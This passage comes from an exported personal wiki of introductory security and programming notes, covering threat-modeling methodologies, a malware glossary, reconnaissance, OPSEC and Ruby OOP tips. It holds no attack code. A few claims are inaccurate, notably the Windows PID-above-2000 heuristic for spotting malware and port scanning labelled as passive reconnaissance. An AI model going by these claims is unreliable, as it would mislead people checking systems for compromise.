**object code (executable)** is the same as the source bode that was compiled
(or interpreted, depending on the language used).

## Risks with Versions

We have to be careful with changes: change can bring multiple risks:

-   Regression: the new version fix problem B but it causes already fixed
    problem B to reaper.
-   Undocumented changes
-   Changes to link libraries: dynamic link not working anymore

To address the issues above, we can use **version control software**:

-   Document and track changes
-   Document approvals
-   Prevent overwriting of previous changes
-   Retain previous versions (to revert back)


===

<!-- Source: computing/security/the-confused-deputy-problem.md -->
<!-- URL: /computing/security/the-confused-deputy-problem -->
<!-- Title: The Confused Deputy Problem -->
<!-- Wikilinks: [[computing/security/the-confused-deputy-problem]], [[security/the-confused-deputy-problem]], [[the-confused-deputy-problem]] -->

---
date: 2022-12-31
---

The Confused Deputy Problem
===========================

The confused deputy problem is, as explained by AWS:

> ... a security issue where an entity that doesn't have permission to
> perform an action can coerce a more-privileged entity to perform the
> action.
> <footer>&mdash;
> <cite>[AWS, The confused deputy problem](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html)</cite></footer>

In other words, it is a form of privilege escalation encountered in
various forms when implementing security mechanisms.

Cross-site request forgery or clickjacking are examples of the confused
deputy problem. For the former, the browser acts as the confused deputy,
to perform sensitive actions against a web application. For the later,
the user is the confused deputy, and is tricked into performing
sensitive actions on another website.


===

<!-- Source: computing/security/threat-modeling.md -->
<!-- URL: /computing/security/threat-modeling -->
<!-- Title: Threat Modeling -->
<!-- Wikilinks: [[computing/security/threat-modeling]], [[security/threat-modeling]], [[threat-modeling]] -->

---
date: 2021-12-14T08:31
---

Threat Modeling
===============

Threat modeling is a process to find threats (vulnerabilities) early on
in order to rank and mitigate them. It is a proactive approach to
security and gives team members a better understanding and knowledge of
the application. The process should fit *into* the organization, and not
the other way around. In other words, the *who* and *when* depends on
the organization.

4 W's of threat modeling:

-   What is Threat Modeling
-   Why you should Threat Model
-   Who should Threat Model
-   When to Treat Model

What is Threat Modeling?
------------------------

Threat modeling needs two important components:

-   **Systematic Approach**: using a model to have a repeatable
    **process**. Threat modeling *is* a process to tackle security in a
    repeatable and consistent fashion during the development life cycle.
    See [[threat-modeling-approach]]#
-   **Looking at Attacks**: actively looking at what and how something
    can be abused. You are looking for *abuse cases* in order to find
    vulnerabilities.

One can see threat modeling as **probable threat scenarios** to which
one produce a **list of potential threats** for a specific application.

Threat modeling is a **holistic approach** to reduce risk and to secure
an application: you are looking at the environment as a *whole* and not
just an isolated software.

See also [[threat-modeling-vocabulary]]# for an overview of often used
vocabulary.

Why Threat Modeling?
--------------------

The goal of threat modeling is **risk reduction**. However there are
myriad of other ways to achieve this goal, so why use threat modeling?

Reasons to use threat modeling include:

-   Pro-active approach: you want to to be pro-active instead of
    reactive afterwards, when threats are discovered during later
    stages. Security up-front.
-   Efficient: the sooner a vulnerability is detected, the cheaper it is
    to fix it. It has a good ROI (business value).
-   Prioritize bugs: to know where to focus energy first.
-   Better understanding: of the whole application. It may help everyone
    have a better insight into potential security issues for the
    application.

Threat modeling is **collaborative, repeatable process**. Not a one-time
exercise.

The output of threat modeling is diagrams, security requirements,
non-requirements, list of threats/vulnerabilities.

Who should Threat Model?
------------------------

We need people who are involved with the application we want to secure.
That means:

-   Application Architect
-   Developer
-   Tester
-   Security Professional

When to Treat Model?
--------------------

As said above, the earlier, the cheaper. Therefore the correct answer is
*as early as possible*. For an application, it is probably during the
**requirements** or **design** phase.

In an agile environment, the threat modeling should ideally be done
during each sprint.

Examples of Threat Models that Go Wrong
---------------------------------------

In practice a big one is the human factor: assuming that the user will
use a strong password and not click on random link are not good
assumptions.

Another good think to remember is that threat model changes over time
and keep up with the technological advancement (like crypotographic key
size).

Methodology
-----------

- [[threat-modeling-methodology]]#
- [[threat-mitigation]]#


===

<!-- Source: computing/security/threat-modeling/stride-per-element-per-interaction-methodology.md -->
<!-- URL: /computing/security/threat-modeling/stride-per-element-per-interaction-methodology -->
<!-- Title: STRIDE-per-Something Methodology -->
<!-- Wikilinks: [[computing/security/threat-modeling/stride-per-element-per-interaction-methodology]], [[security/threat-modeling/stride-per-element-per-interaction-methodology]], [[threat-modeling/stride-per-element-per-interaction-methodology]], [[stride-per-element-per-interaction-methodology]] -->

---
date: '2022-12-16T17:26:53+0900'
---

# STRIDE-per-Something Methodology

To get started with STRIDE, one can think about all the *element* or all
the *interaction* between components.

STRIDE-per-element is good for beginners, but STRIDE-per-interaction
makes it easier to understand threats.

## STRIDE-per-Element

Different threats affect each type of element:

-   External Entity
-   Process
-   Data Store
-   Dataflow

## STRIDE-per-Interaction

Focus shift from individual elements to the interactions between
elements, then concentrate on where those components "meet".


===

<!-- Source: computing/security/threat-modeling/threat-mitigation.md -->
<!-- URL: /computing/security/threat-modeling/threat-mitigation -->
<!-- Title: Threat Mitigation -->
<!-- Wikilinks: [[computing/security/threat-modeling/threat-mitigation]], [[security/threat-modeling/threat-mitigation]], [[threat-modeling/threat-mitigation]], [[threat-mitigation]] -->

---
date: '2022-12-16T17:27:55+0900'
---

# Threat Mitigation

Mitigation is a specific task or step to reduce the likelihood or impact
of a threat.

Three main ways are:

-   **Accept Risk**: low rating or too expensive (more than dealing with
    the threat itself)
-   **Policies/Contracts**: written rules with consequences (for example
    an API with an SLA)
-   **Security Controls (the preferred way to mitigate risks as they
    reduce the likelihood of being exploited)**: code written to reduce
    risk of exploitation ; safety net for developers. Good security
    controls can be used across different applications to make security
    functionality easier to implement. They must be:
    -   Vetted: approved by security team
    -   Requirement: required use across organization; reusable


===

<!-- Source: computing/security/threat-modeling/threat-modeling-approach.md -->
<!-- URL: /computing/security/threat-modeling/threat-modeling-approach -->
<!-- Title: Threat Model Approach -->
<!-- Wikilinks: [[computing/security/threat-modeling/threat-modeling-approach]], [[security/threat-modeling/threat-modeling-approach]], [[threat-modeling/threat-modeling-approach]], [[threat-modeling-approach]] -->

---
date: 2021-12-14T23:37
---

Threat Model Approach
=====================

The goal is to be able to general a list of threats.

At a high level, the main advantages and disadvantages of the three
approaches are as follows:

1.  Asset-centric approach (good for quantifying risk to upper
    management)
    -   $+$ Quantifying risk for management
    -   $-$ Translation from assets to threats (difficult)
2.  Attacker-centric approach (good for penetration testers)
    -   $+$ Makes threats modeling tangible
    -   $-$ Specialized knowledge necessary (red team)
3.  Application-centric approach (good for developer team)
    -   $+$ Most effective for application developers
    -   $-$ Developers may have blind spots about their application

A team chooses an approach based on their skill set.

Asset-centric Approach
----------------------

1.  Create a list of assets
2.  Draw assets, components and data flows
3.  For each element, check for threats

Advantages of this approach:

-   Centered around assets
-   Focused towards business impact
-   Well suited for risk assessments

Disadvantages are:

-   Not centered around the application
-   Mapping assets to threats is difficult

An example of a risk-centric threat modeling approach is **PASTA**:
**P**rocess for **A**ttack **S**imulation and **T**hreat **A**nalysis.

Another one is **TRIKE**.

Attacker-centric Approach
-------------------------

Also known as *security* centric.

1.  Create a list of **threat actors**: each of them are to be matched
    with the following:
2.  **Motives**: why would they threaten you.
3.  **Financial and technical means**: what impact they potentially have
4.  **Opportunity**: how can the threat actor actually perform its
    attack.
5.  From the last point we can create a **list of threats**

Advantages:

-   Makes threats and attacks more visible
-   Movie-plot-threats brainstorming is fun

Disadvantages:

-   Easy to miss technical threats
-   Unrealistic threats
-   Biased results (depends on who brainstorm it)
-   Attacker "thinking" required (like a penetration tester)

Application-centric Approach
----------------------------

Instead of thinking about risks or attacks first, this approach makes
you start with what you are actually working on: the application.

1.  Draw a diagram of the application, for example a Data Flow Diagram
    (or DFD)
2.  List threats for each element using a classification model such as
    -   **STRIDE** (often used, see [[stride-per-element-per-interaction-methodology]]#)
    -   **OWASP Top 10**
3.  Rank threats using classification model above.

Advantages:

-   Common understanding of the application
-   Spread of knowledge

Disadvantages:

-   Good documentation is necessary
-   Difficult to see "own" vulnerabilities
-   Threats may sound abstract


===

<!-- Source: computing/security/threat-modeling/threat-modeling-for-personal-usage.md -->
<!-- URL: /computing/security/threat-modeling/threat-modeling-for-personal-usage -->
<!-- Title: Threat Modeling for Personal Usage -->
<!-- Wikilinks: [[computing/security/threat-modeling/threat-modeling-for-personal-usage]], [[security/threat-modeling/threat-modeling-for-personal-usage]], [[threat-modeling/threat-modeling-for-personal-usage]], [[threat-modeling-for-personal-usage]] -->

---
date: '2023-06-04T11:10:09+0900'
---

# Threat Modeling for Personal Usage

[[threat-modeling]] is often an activity done in a company to protect
assets and businesses. However, it can also be done for Personal Usage.
People in the "privacy" community tries to be security and privacy
extremists and often ends up burned out or making OpSec mistake (see
[[what-is-opsec]]).

Trying to protect oneself from everything every time is almost guarantee to fail (except maybe with a great dose of luck).

Better to know what we are protecting oneself against and **threat modeling** to know what we want to protect and against who or what.

## Threat Modeling Assessment

Five common questions to start improving one security:

1.  What do you want to protect?
2.  Who do you want to protect it from?
3.  How likely is it that you will need to protect it?
4.  How bad are the consequences if you fail?
5.  How much trouble are you willing to go through in order to try to prevent those?

## 1. What do you want to protect?

Generally data. Emails, credentials, pictures and videos, credit cards information, text messages but also meta data (when, where and how said where generated).

Moreover it can be a concept like impersonation, one activities or behavior.

| List of Data | Location of Data | User Access | Protection Against Unauthorized Access |
|--------------|------------------|-------------|----------------------------------------|
| Example      | Example          | Example     | Example                                |

## 2. Who do you want to protect it from?

Who might want to target you or your information?

Those people or entities are called adversaries. They can be anyone from family member to government, hackers, your boss or an ex-partner.

| List of Adversaries | Information They May Be After |
|---------------------|-------------------------------|
| Example             | Example                       |

## 3. How likely is it that you will need to protect it?

We need to assess risk to rightly allocate resources. If the risk of something happening is low, it may be a waist to spend too much time thinking about it or protecting data.

Risk, though, is different than capability. The capability of something to materialize can be high but the risk of happening may be low.

| List of Adversaries | Risk of Attack | Capability |
|---------------------|----------------|------------|
| Example             | Example        | Example    |

## 4. How bad are the consequences if you fail?

We need to separate what they can do and what is the consequences of their wrongdoing. A hacker reading your message may pose a problem but may still be of less consequence than a state actor in a repressive regime.

| List of Adversaries | What They May Do With Your Data |
|---------------------|---------------------------------|
| Example             | Example                         |

## 5. How much trouble are you willing to go through in order to try to prevent those?

This question cannot be answered without assessment in question three. Here, the goal is to debate if combating the threat is worth it or not. Answering this question is very personnel and varies depending of one's situation.

| List of Adversaries | Threats to Combat or Not (and Reasons) |
|---------------------|----------------------------------------|
| Example             | Example                                |

More info here: [Surveillance Self Defense: Threat Modeling \| Electronic Frontier Foundation](https://www.eff.org/document/surveillance-self-defense-threat-modeling)
and [here](https://www.wired.com/2017/12/digital-security-guide/)


===

<!-- Source: computing/security/threat-modeling/threat-modeling-methodology.md -->
<!-- URL: /computing/security/threat-modeling/threat-modeling-methodology -->
<!-- Title: Threat Modeling Methodology -->
<!-- Wikilinks: [[computing/security/threat-modeling/threat-modeling-methodology]], [[security/threat-modeling/threat-modeling-methodology]], [[threat-modeling/threat-modeling-methodology]], [[threat-modeling-methodology]] -->

---
date: 2021-12-15T09:27
---

Threat Modeling Methodology
===========================

{.ui .memo .info}
Some of the methodologies below are Risk Analysis/Threat Analysis
methodology. Still it's good to know about them from a threat modeling
perspective.

All the modeling methodologies below are *asset* or
*application*-centric methodologies (see #[[threat-modeling-approach]]).

Methodology depends heavily on the team, the organization and the set
goals. As a general rules of thumb, though, for an *asset-centric*
modeling, **PASTA** is a good fit (business integration). For an
*application-centric* modeling, the **Microsoft Threat Modeling** is a
good fit.

While the number of steps differ from one threat model methodology to
another, the generic process is almost always the same:

-   Set scope
-   Analyze target
-   Identify threats
-   Rate threats

PASTA
-----

-   **P**rocess for **A**ttack **S**imulation and **T**hreat
    **A**nalysis.
-   Approach: asset-centric
-   Methodology: Threat analysis and threat modeling (which means one
    needs the input of threat intelligence and to evaluate the threat
    continuously)

PASTA is good for medium to large size companies, mature companies and
companies that have lot of security knowledge.

It needs executive sponsorship and is an iterative, maturing process.
It's geared towards management.

7 steps:

1.  Define Business Objectives
2.  Define Technical Scope: identify which components are in scope
3.  Decompose Application: dataflow diagram (DFD)
4.  Analyze Threats: input from sources (threat intelligence)
5.  Identify Vulnerabilities: assert viability of vulnerabilities and
    rank them using a scoring system
6.  Enumerate Attacks: attack tress, attacks that are mapped to
    vulnerabilities
7.  Perform Impact Analysis: analyzes the residual risks, or whether the
    risks are acceptable for the company.

Advantages:

-   Great for business integration
-   Mature, well described processes
-   Tooling available

Disadvantages:

-   Specialized input necessary
-   Time consuming
-   Each step generates lot of output
-   Lot of intermediate models
-   Dependent on dynamic input

Microsoft Threat Modeling
-------------------------

-   Not to be confused with STRIDE (threat classification system)
-   Approach: application-centric

The Microsoft Threat Modeling framework is a simple and lightweight
developer-driven framework which focuses on technical risks. It is easy
to understand even to non initiate and it's practical (uses plain
English). It is best used in the development life-cycle.

Steps:

1.  Identify assets: what you are trying to protect
2.  Create architecture overview: document architecture of app,
    including subsystems, dataflow, [[trust-boundary-and-entry-point]]#
3.  Decompose application: find configurations and vulnerabilities
4.  Identify the threats: using the vulnerabilities found in the
    previous step. With a threat actor in mind, one can…
5.  Document the threats
6.  Rate the threats: using a scoring like DREAD, CVSS or OWASP risk
    rating methodology to prioritize the threats

The output is a document listings threats as well as diagrams of the
application.

Advantages:

-   Easy to pick up
-   Easy to use in software Development life cycle
-   Flexible

Disadvantages

-   More practical than academic (not rigid)
-   STRIDE methodology is redundant
-   Does not factor risk for the business. it revolves around the
    application

OCTAVE
------

Not a pure threat modeling methodology but a *risk analysis framework*.

-   **O**perationnaly **C**ritical **T**hreat, **A**sset and
    **V**ulnerability **E**valuation
-   Evaluate organization rather than applications
-   Geared towards big company
-   Different versions:
    -   OCTAVE-S for smaller company
    -   OCTAVE Allegro focus primarily on information assets
-   "Asset-centric approach" (in " because not a pure threat modeling
    methodology )

Steps:

1.  Establish drivers (measure risks)
2.  Profile assets: what is in scope
3.  Identify threats
4.  Identify and mitigate risks: mitigate risk in contrast to pure
    threat modeling methodology

OCTAVE focuses on organizational risks rather than technicals risks. It
is flexible and self-directed.

Advantages:

-   Improve risk-aware corporate culture
-   In depth
-   Flexible

Disadvantages

-   Complex
-   Lot of paperwork
-   Require investments

Trike
-----

-   Methodology as well as a [tool](https://www.octotrike.org/).
-   High level of automation are possible: threats are automatised, not
    brainstorming involved
-   Asset-centric approach

Focus on defensive side, on how to protect assets.

Steps :

Roughly two phases: System analysis phase (first step) and security
analysis phase (the rest of the steps).

1.  Model system: Systems analysis phase. Systems and their security
    goals are described here.
2.  Identify threats
3.  Investigate threats
4.  Identify mitigations
5.  Investigate mitigations

Outputs three models:

-   Requirements model
-   Implementation Model
-   Risk model

Advantages:

-   Automatically generates threats
-   Consistent results
-   Built-in tool

Disadvantages:

-   Does not scale well
-   Not maintained anymore (or so it seems)

VAST
----

-   **V**isual **A**gile **S**imple **T**hreat **M**odeling
-   Two threat model types:
    -   Application threat model
    -   Operational threat model
-   Process flow diagram (instead of data flow diagram)

VAST is targeted towards agile companies and is very scalable.

Advantages:

-   Flexible
-   Scalable
-   Process flow diagrams might be easier than data flow diagram

Disadvantages:

-   Not open
-   No free documentation or guidance


===

<!-- Source: computing/security/threat-modeling/threat-modeling-vocabulary.md -->
<!-- URL: /computing/security/threat-modeling/threat-modeling-vocabulary -->
<!-- Title: Threat Modeling Vocabulary -->
<!-- Wikilinks: [[computing/security/threat-modeling/threat-modeling-vocabulary]], [[security/threat-modeling/threat-modeling-vocabulary]], [[threat-modeling/threat-modeling-vocabulary]], [[threat-modeling-vocabulary]] -->

---
date: '2021-12-14T08:53'
---

# Threat Modeling Vocabulary

-   **Weakness**: software defect (or bug)
-   **Vulnerability**: software weakness that can be *exploited*
-   **Attack**: 3 different properties
    -   *Target*: something of value
    -   *Attack Vector*: the mean to reach the target
    -   *Threat Actor*: the one carrying the attack
-   **Attack Surface**: anything that can be *obtained*, *used* or
    *attacked* by a threat actor.
-   **Risk** = Impact $\times$ Likelihood
    -   *Impact*: the negative outcome of an attack
    -   *Likelihood*: the probability of something happening
-   **Attack Tree**: A tree structure that represents attacks against a
    system. The root node represents the goal of the attacker and the
    leaf nodes represent the different ways to achieve that goal (see
    example below)
-   **Attack Library**: Detailed list of attacks against a system.
    *Note:* don't rely solely on attack libraries to threat model, they
    are narrow in focus. Every applications has unique qualities that
    generalized attack libraries can't predict.
    -   CAPEC: MITREs Common Attack Pattern Enumeration and
        Classification
    -   OWASP Top10: Web application risks

## Simple Attack Tree

``` {.txt}
Sensitive data breach
--> SQL Injection
    --> Queries not parameterized
    --> Input not validated
    --> Inputs not sanitized
    --> No Object Relation Mapper (ORM) used
--> Exposed Files
    --> Public S3 bucket
    --> Privilege escalation
        --> Improper access control
```


===

<!-- Source: computing/security/threat-modeling/trust-boundary-and-entry-point.md -->
<!-- URL: /computing/security/threat-modeling/trust-boundary-and-entry-point -->
<!-- Title: Trust Boundary and Entry Point -->
<!-- Wikilinks: [[computing/security/threat-modeling/trust-boundary-and-entry-point]], [[security/threat-modeling/trust-boundary-and-entry-point]], [[threat-modeling/trust-boundary-and-entry-point]], [[trust-boundary-and-entry-point]] -->

---
date: '2022-12-16T17:26:38+0900'
---

# Trust Boundary and Entry Point

**Trust Boundary:** a place where two entities with different permissions interact with one another.
Threats often come from trust boundaries.

Example: a user from the internet interacts with a web server on corporate network --\> trust boundary between user (not trusted) and web server (trusted).

**Entry Point:** a "door" into your system; user began the interaction and data is entered.
Entry points are always trust boundaries but reverse is not true.


===

<!-- Source: computing/security/ttps-tactics-techniques-and-procedures.md -->
<!-- URL: /computing/security/ttps-tactics-techniques-and-procedures -->
<!-- Title: TTPs: Tactics, Techniques & Procedures -->
<!-- Wikilinks: [[computing/security/ttps-tactics-techniques-and-procedures]], [[security/ttps-tactics-techniques-and-procedures]], [[ttps-tactics-techniques-and-procedures]] -->

---
date: 2022-08-19
---

TTPs: Tactics, Techniques & Procedures
======================================

TTPs refer to activities and patters that attackers or group (including
APT) will utilize.

They are useful to profile attackers.

TTPs can be found online. This can help get an idea of who's coming at
you.

Tactics
-------

Way the attacker operates during the different phases of the attack.

Using the tactics we can profile the attackers, the methods they
typically follow for the initial compromise. Some may only use OSINT
while other may only use social engineering or pivoting from a third
party into an organization.

Understanding tactics helps anticipate attackers next move by
understanding their tactics.

Techniques
----------

Specific techniques used, including how did they initially do the
exploitation? What was the setup to maintaining the C&Cs?

Procedures
----------

The sequence of actions that are performed by attackers to gain or
achieve certain goals throughout their attack life cycle.


===

<!-- Source: computing/security/what-is-malware.md -->
<!-- URL: /computing/security/what-is-malware -->
<!-- Title: What is Malware? -->
<!-- Wikilinks: [[computing/security/what-is-malware]], [[security/what-is-malware]], [[what-is-malware]] -->

---
date: 2021-04-24T23:06
---

# What is Malware?

Malware are a piece of software or program used to performs malicious
actions on a target.

**Mal**icious + soft**ware** = _malware_

Malware infect any kind of device: computer, phone, tablet…

## Basic Components of Malware

**Crypter**: software that conceal the existence of malware. Used to elude
antivirus from detecting it. Also protects the malware against reverse
engineering analysis.

**Downloader**: piece of software that download the malware. Can be another
malware or trojan or a simple script.

**Dropper**: install malware or some code on the system covertly. Uses
unidentifiable malware code that's undetected by antivirus scanners.

**Exploit**: the part of the malware that contains the code or the sequence
of commands that it takes to take advantage of the device. It's the code
used to breach the system securely. Exploits can be _local_ or _remote_.

**Injector**: injects the exploit or code form the malware into the system.
Hide or prevent the malware from being removed. Reloads the malware if
necessary.

**Obfuscators**: conceal the malware or the malicious code by mean of
different techniques. Makes it harder for program and/or professionnal to
find and remove the malware.

**Packer**: compress the malware file and converts it to an unreadable
format so that it cannot be detected.

**Payload**: the actual file that is activated, used to delete files infect
the system, encrypt the system etc.

**Malicious Code**: defines the basic functionality of the malware and
include the commands that result in the security breaches itself. Can be
ActiveX control, Java appletm browser plugins etc.

## Types of Malware

### Propagation Malware

**Virus**: requires human assistance, meaning one needs to execute the file
in order to get infected.

**Worms**: automatic; squirms throughout network infrastructure without
human help.

### Concealment Malware

**Rootkit**: hides itself by modifying the OS so it's not visible to the
end user.

**Trojan**: hidden inside a disired file.

## History Bits

In 1996, the first federal computer sabotage case took place. Timothy
Lloyd, a network manager and administrator for Omega Engineering created
what is called a _logic bomb_: he created a user account that was called
`12345` with no password and full administrator rights. His logic bomb
would execute if he didn't login for 20 days, using the `12345` account to
login and execute a script called `fix` that would delete files, and purge
it to hide his tracks. As Omega Engineering did business with United States
Navy and NASA, the Secret Service had to get involved. They found the same
logic bomb in Lloyd personal computer. He was convinced of computer
sabotage and sentenced to 41 months in federal prison.

## Things to Look For

On Microsoft Windows, every program with a PID higher than 2000 is launched
after the operating system fires up. This is generally where to pay
attention to.

If a task is not familiar, try opening it's location to see where it is
going. Look also for the `Details` tab of `Properties` which gives more
information about it. Searching online is also a good idea, when possible.

You should be suspicious of every task above 2000 that does not have an
icon.


===

<!-- Source: computing/security/what-is-opsec.md -->
<!-- URL: /computing/security/what-is-opsec -->
<!-- Title: What is OPSEC? -->
<!-- Wikilinks: [[computing/security/what-is-opsec]], [[security/what-is-opsec]], [[what-is-opsec]] -->

---
date: 2021-06-07T14:45
---

What is OPSEC?
==============

According to Wikipedia,

> Operations security (OPSEC) is a process that identifies critical
> information to determine if friendly actions can be observed by enemy
> intelligence. - Wikipedia

A good reason to practice good OPSEC in daily life is to protect
ourselves from hackers, criminals and perhaps a little bit too nosy
government.


===

<!-- Source: computing/security/what-is-reconnaissance-footprinting.md -->
<!-- URL: /computing/security/what-is-reconnaissance-footprinting -->
<!-- Title: What is Reconnaissance/Footprinting -->
<!-- Wikilinks: [[computing/security/what-is-reconnaissance-footprinting]], [[security/what-is-reconnaissance-footprinting]], [[what-is-reconnaissance-footprinting]] -->

---
date: 2022-08-19
---

What is Reconnaissance/Footprinting
===================================

> Research is formalized curiosity. It is poking and prying with a
> purpose.
>
> ```{=html}
> <footer>— <cite>Zora Neale Hurston</cite></footer>
> ```

Reconnaissance
--------------

Reconnaissance (also *recon*) is a fundamental process during the
hacking steps.

Through recon, hackers will gather information about their targets. In
general, 70% of the time is spent on this phase.

### Key Steps

1.  **Gather elementary intel**: what is the website? Where is the
    company physically? When was it founded? Who's the C-suit?
2.  **Identify operating system**: Windows? Linux? What web server?
    Which version? What's their network architecture (router, switches,
    VPN etc)?
3.  **Perform queries**: what DNS names do they have? Which company is
    hosting a particular resource? Which company are they partnering
    with?
4.  **Discover vulnerabilities**: using the operating system and their
    versions, list known vulnerabilities that we can use.

Mapping the network of the target, including IP addresses, DNS name and
other system found during the first step is also essential to success of
our endeavor.

### Target Information Profile (TIP)

Use the TIP to notate possible vulnerabilities to prioritize attacks.
Start with the path of least resistance (low-hanging fruits) and keep
track of the tried attacks.

### Type of Reconnaissance

-   **Passive**: no direct contact with the target. Port scanning,
    control mechanisms, IDS etc.
-   **Active**: going to a job interview, asking questions about the
    employees, walking through the environment.
-   **Anonymous**: gathering information from sources that can't
    identify you.
-   **Private**: (also *organizational*). Getting information on event
    calendar, email services, social media…
-   **Pseudonymous**: information about the company indirectly posted by
    an insider, such as an employee who wants to remain anonymous, a
    whistleblower etc.

Footprinting
------------

Footprinting is an activity with the goal of **providing** a
comprehensive picture of the company's security posture.

It should **focus** on specific areas of a target and **identify**
weakness and vulnerabilities.

It is also helpful to **build** a network map.


===

<!-- Source: computing/security/what-is-security.md -->
<!-- URL: /computing/security/what-is-security -->
<!-- Title: What is Security? -->
<!-- Wikilinks: [[computing/security/what-is-security]], [[security/what-is-security]], [[what-is-security]] -->

---
date: 2021-12-19T18:31
---

What is Security?
=================

Security in general is about achieving some **goal** when there is an
adversary present.

A secure system is one that can actually do something, regardless of
what the bad guy is trying to do to you.

The general way to think about security at a high lovel is to break it
in three parts:

1.  Policy: statement about what I want my system to be able to do.
    Typical policies is concerned with the **confidentiality** of data,
    the **integrity** of data nad **availability** of data.
2.  Threat model: a set of assumptions about the adversary (see
    [[threat-modeling]]#). As a general rule it's much better to err on
    the side of caution.
3.  Mechanism: the software, hardware or system, implementation etc.
    that's going to try to make sure our policy is followed as long as
    the bad guys follow the threat model.

If our threat model is correct, hopefully we'll satisfy our policy. And
the mechanism should work as well.

Why is it Hard?
---------------

In theory the rules are pretty simple, but in practice breaches and bugs
are fairly common.

The reason is *policy* is a **negative goal**: the security policy must
works regardless of what the attacker can do.

For example for a file system, it's easier to have a rule that says "$x$
and $y$ can access the file" than "no one other than $x$ or $y$ can
access the file" it's a much more difficult problem to solve.

There is no right answer, a clear cut as to what the right sets of
assumptions to make is: it is an **iterative process**.

In practice, people often get all three points above (policy, threat
model and mechanism) wrong.

[Source](https://www.youtube.com/watch?v=GqmQg-cszw4&list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&index=1)


===

<!-- Source: computing/software.md -->
<!-- URL: /computing/software -->
<!-- Title: Software -->
<!-- Wikilinks: [[computing/software]], [[software]] -->

---
date: 2020-08-02
---

# Software

Writing software is quite frustrating at first but highly rewarding when it
works.

Here is a bunch of notes of things I am working on.

## Programming Languages

* [[ruby]]# The programming language I use to learn programming.
* [[java]]#
* [[html-css]]#

## Programming Related

* [[regex]]#
* [[control-character]]#
* [[pass-by-reference-pass-by-value]]#
* [[evaluate-block]]#
* [[shallow-copy]]#
* [[vim-keystrokes]]#
* [[working-collections]]#
* [[kakoune-how-to]]#
* [[divisions-integer]]#
* [[local-variable-scope]]#
* [[difference-between-boolean-values-truthy-falsey]]#
* [[variables-as-pointers]]#
* [[recursive-methods]]#
* [[tabbing-bracing-style]]#
* [[what-is-object-oriented-programming]]#
* [[pairwise-testing]]#
* [[instance-methods-vs-class-methods]]#
* [[duck-typing]]#
* [[attributes-vs-state]]#
* [[collaborator-objects]]#
* [[closure]]#
* [[seat-approach]]#
* [[heredoc]]#
* [[firefox-developer-tools]]#
* [[dates-to-test]]#
* [[tmux-keystroke-idioms]]#
* [[software-architecture]]#
* [[logical-operators]]#
* [[method-definition-method-invocation]]#
* [[mutable-and-immutable-objects]]#
* [[mutation-in-arrays]]#
* [[parameter-argument]]#
* [[variable-scope-oop]]#
* [[variable-shadowing]]#

Database
--------

-   [[sql]]#
-   [[relational-database-management-system]]#
    -   [[postgresql]]#

## Operating Systems

* [[linux]]#

## Git

* [[fork-repository-upstream]]#
* [[fix-bag-merge-git]]#
* [[what-is-fast-forward-in-git]]#

## Other Softwares

* [[nut-openwrt]]#
* [[cd-dvd-iso]]#
* [[rsync-backup]]#
* [[svg-optimization]]#
* [[heroku]]#
* [[download-music-youtube-dl]]#
* [[email-with-plus]]#
* [[torrent-client-settings]]#
* [[oauth-openid-connect]]#
* [[containers-primer]]#
* [[reset-synology-dsm-firewall]]#
* [[cloning-pages-with-wget]]#

### FFmpeg

* [[flac-compression-levels-ffmpeg]]#
* [[ffmpeg-transcode-dts]]#

## Other

* [[leaning-toothpick-syndrome]]#
* [[cap-theorem]]#


===

<!-- Source: computing/software/approach-to-oop.md -->
<!-- URL: /computing/software/approach-to-oop -->
<!-- Title: Approach to OOP -->
<!-- Wikilinks: [[computing/software/approach-to-oop]], [[software/approach-to-oop]], [[approach-to-oop]] -->

---
date: 2021-04-18T11:52
---

# Approach to OOP

There are many approach to Object Oriented Programming. Here is one.

1. Write a textual description of the problem to solve
2. Exract major _nouns_ and _verbs_ from the description
3. Organize and associate the _verbs_ with the _nouns_
4. Make an initial guess at organizing: _Nouns_ are the **classes** and
   _verbs_ are the **methods**
5. After much iteration, model your thoughts into CRC cards

In object oriented, we are not concerned with the flow logic. It's all about
organizing and modularizing the code into a cohesive structure: **classes**.

The flow of the program is orchestrated after, using objects instantiated from
the classes.

Following, we need to add a code to launch the program. A straigtforward way to
do it is to use an orchestration engine.

## Orchestrated Engine

The orchestration "engine" is the class where the procedural program flow will
be. It needs an easy interface to kick things off as well as the objects
required to facilitate the execution of the program.

## Explore the Problem

Finding the right classes and methods on the first try is almost impossible and
not something we should be willing to achieve.

Start with an exploratory code and test different code by playing around and
validate your hypotheses.

While exploring you will get a better feel for possible solution and way to
organize your code into coherant classes and methods.

## Look for Repetitive Nouns in Method Names

A repetitive _noun_ may be a sign the logic need its own class.

## Check your Method Name

Don't include the class name in the method.

```ruby
class Player
  def player_info
    # do something
  end
end

player1 = Player.new
player2 = Player.new

puts player1.player_info # Super redundant
puts player2.player_info # Super redundant
```

Also, pick a consistent naming convention which is easy to remember and
give a good idea of what the method does.

---

Finally, remember this quote from programmers that have been doing it for
years:

> Premature optimization is the root of all evil.


===

<!-- Source: computing/software/attributes-vs-state.md -->
<!-- URL: /computing/software/attributes-vs-state -->
<!-- Title: Attributes vs State -->
<!-- Wikilinks: [[computing/software/attributes-vs-state]], [[software/attributes-vs-state]], [[attributes-vs-state]] -->

---
date: 2021-06-04T08:54
---

# Attributes vs State

In #[[classes-and-objects]] we wrote that an object's **attributes** and
**behaviors** are defined in classes and that attributes of an object are
tracked by its **states**, while **behaviors** are what objects are capable
of doing.

But this is still a bit confusing. Here is a table

<table class="ui celled table">
  <thead>
    <tr>
      <th>Concept</th>
      <th>Meaning</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Concept">Attributes</td>
      <td data-label="Meaning">What the object is made of: its instance variables' name and value. It also have to be accesssible from outside, i.e. have getter/setter methods.</td>
    </tr>
    <tr>
      <td data-label="Concept">States</td>
      <td data-label="Meaning">Collection of all instance variables and their values. All the object's attributes.</td>
    </tr>
    <tr>
      <td data-label="Concept">Behaviors</td>
      <td data-label="Meaning">What the object is able to do: its instance methods.</td>
    </tr>
  </tbody>
</table>

{.ui .info .message}
Regarding inheritance: instance variables are not inherited and have
nothing to do with the inheritance mechanism. They appear to be inherited
because instance variables are created by the methods that first assign
values to them. Those _methods_ are often inherited.


===

<!-- Source: computing/software/cap-theorem.md -->
<!-- URL: /computing/software/cap-theorem -->
<!-- Title: CAP theorem -->
<!-- Wikilinks: [[computing/software/cap-theorem]], [[software/cap-theorem]], [[cap-theorem]] -->

---
